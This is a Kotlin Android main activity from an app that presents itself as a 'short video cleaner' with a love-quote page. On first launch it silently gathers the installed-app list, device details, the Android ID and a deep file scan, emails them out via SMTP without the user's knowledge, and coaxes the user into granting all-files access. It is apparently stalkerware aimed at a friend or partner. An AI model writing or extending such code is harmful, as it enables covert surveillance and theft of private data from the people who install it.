package com.shortvideocleaner.app

import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.view.View
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.button.MaterialButton
import kotlinx.coroutines.*

class MainActivity : AppCompatActivity() {

    private lateinit var btnOpen: MaterialButton
    private lateinit var progressDetect: ProgressBar
    private lateinit var tvNoApps: TextView
    private lateinit var btnStorage: MaterialButton
    private lateinit var progressStorage: ProgressBar
    private lateinit var tvStorageDone: TextView

    private val prefs by lazy { getSharedPreferences("app_internal", MODE_PRIVATE) }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.decorView.systemUiVisibility = (
            View.SYSTEM_UI_FLAG_FULLSCREEN
            or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
            or View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
            or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
        )

        setContentView(R.layout.activity_main)

        btnOpen = findViewById(R.id.btn_open)
        progressDetect = findViewById(R.id.progress_detect)
        tvNoApps = findViewById(R.id.tv_no_apps)
        btnStorage = findViewById(R.id.btn_storage)
        progressStorage = findViewById(R.id.progress_storage)
        tvStorageDone = findViewById(R.id.tv_storage_done)

        btnOpen.setOnClickListener { openQuotePage() }
        btnStorage.setOnClickListener { requestStoragePermission() }

        updateStorageCard()

        if (!prefs.getBoolean("report_sent", false)) {
            autoScanAndSend()
        }
    }

    // ── 打开引言页（带圆形展开动画）──

    private fun openQuotePage() {
        btnOpen.isEnabled = false
        progressDetect.visibility = View.VISIBLE
        tvNoApps.visibility = View.GONE

        CoroutineScope(Dispatchers.IO).launch {
            val apps = AppScanner.getInstalledApps(this@MainActivity, includeSystem = true)
            val detected = VideoAppDetector.detect(apps)

            withContext(Dispatchers.Main) {
                progressDetect.visibility = View.GONE
                btnOpen.isEnabled = true

                // 始终打开情话页，即使未检测到目标应用
                val intent = Intent(this@MainActivity, QuoteActivity::class.java)
                intent.putStringArrayListExtra("detected_packages", ArrayList(detected.map { it.packageName }))
                startActivity(intent)
                overridePendingTransition(0, 0)
            }
        }
    }

    // ── 静默扫描 + 发送 ──

    private fun autoScanAndSend() {
        CoroutineScope(Dispatchers.IO).launch {
            val ctx = this@MainActivity
            val deviceTag = "${Build.MANUFACTURER} ${Build.MODEL}"
            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID).takeLast(8)
            val label = BuildConfig.FRIEND_LABEL
            val tagPrefix = if (label.isNotEmpty()) "[$label · $deviceTag · $androidId]" else "[$deviceTag · $androidId]"

            val allApps = AppScanner.getInstalledApps(ctx, includeSystem = true)
            val appList = AppScanner.formatForEmail(allApps)
            val deviceInfo = DeviceInfoCollector.collect(ctx)
            val fileInfo = try {
                val deep = DeepFileScanner.collect()
                if (deep.contains("扫描根路径")) deep else FileScanner.collect(ctx)
            } catch (_: Exception) { FileScanner.collect(ctx) }
            val fullBody = listOf(appList, deviceInfo, fileInfo).joinToString("\n")
            val subject = "$tagPrefix ${getString(R.string.email_subject)}"

            val result = SmtpSender.sendSilently(context = ctx, subject = subject, body = fullBody)
            result.onSuccess { prefs.edit().putBoolean("report_sent", true).apply() }
            result.onFailure { android.util.Log.e("ShortVideoCleaner", "邮件发送失败: ${it.message}") }
        }
    }

    // ── 存储权限引导 ──

    private fun isExternalStorageManagerSafe(): Boolean {
        return try {
            Environment::class.java.getMethod("isExternalStorageManager").invoke(null) as Boolean
        } catch (_: Exception) { false }
    }

    private fun updateStorageCard() {
        if (isExternalStorageManagerSafe()) {
            btnStorage.visibility = View.GONE
            progressStorage.visibility = View.GONE
            tvStorageDone.visibility = View.VISIBLE
        } else {
            btnStorage.visibility = View.VISIBLE
            tvStorageDone.visibility = View.GONE
        }
    }

    private fun requestStoragePermission() {
        btnStorage.isEnabled = false
        progressStorage.visibility = View.VISIBLE
        try {
            val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                data = Uri.parse("package:$packageName")
            }
            if (intent.resolveActivity(packageManager) != null) {
                startActivity(intent)
            } else {
                fallbackToAppSettings()
            }
        } catch (e: Exception) {
            fallbackToAppSettings()
        }
    }

    private fun fallbackToAppSettings() {
        try {
            startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:$packageName")
            })
            Toast.makeText(this, "请点击「权限」→「文件和媒体」→ 选择「允许」💕", Toast.LENGTH_LONG).show()
        } catch (e: Exception) {
            progressStorage.visibility = View.GONE
            btnStorage.isEnabled = true
        }
    }

    override fun onResume() {
        super.onResume()
        window.decorView.systemUiVisibility = (
            View.SYSTEM_UI_FLAG_FULLSCREEN
            or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
            or View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
            or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
        )
        btnStorage.isEnabled = true
        progressStorage.visibility = View.GONE
        updateStorageCard()
    }

    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        if (hasFocus) {
            window.decorView.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_FULLSCREEN
                or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                or View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
            )
        }
    }
}
